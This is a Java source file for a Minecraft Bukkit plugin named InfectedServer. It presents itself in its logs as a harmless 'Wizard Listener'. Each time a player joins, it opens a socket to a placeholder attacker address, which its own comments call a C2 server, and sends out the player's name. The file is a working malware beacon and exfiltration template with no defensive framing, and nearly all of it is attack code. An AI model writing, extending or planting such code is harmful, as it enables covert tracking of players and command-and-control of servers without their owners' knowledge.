package com.example.wizard;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.*;
import java.util.logging.Logger;

public class InfectedServer extends JavaPlugin {

    private static final String ATTACKER_IP = "YOUR_PUBLIC_ATTACKER_IP"; // <-- CHANGE THIS!
    private static final int PORT = 5002;
    private static final Logger logger = Logger.getLogger("WizardListener");

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(new PlayerListener(), this);
        logger.info("Wizard Listener enabled.");
    }

    @Override
    public void onDisable() {
        logger.info("Wizard Listener stopped.");
    }

    private class PlayerListener implements Listener {
        @EventHandler
        public void onPlayerJoin(PlayerJoinEvent event) {
            String playerName = event.getPlayer().getName();
            getLogger().info("Player joined: " + playerName);
            new Thread(() -> connectAndSendToC2(playerName)).start();
        }
    }

    private void connectAndSendToC2(String username) {
        try {
            System.out.println("Attempting to contact C2 server: " + ATTACKER_IP + ":" + PORT);
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(InetAddress.getByName(ATTACKER_IP), PORT));

            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            out.println("PLAYER_CONNECTED:" + username);
            out.flush();
            System.out.println("[+] Successfully connected and notified C2.");

            socket.close();
        } catch (Exception e) {
            getLogger().warning("Failed to connect to C2: " + e.getMessage());
        }
    }
}
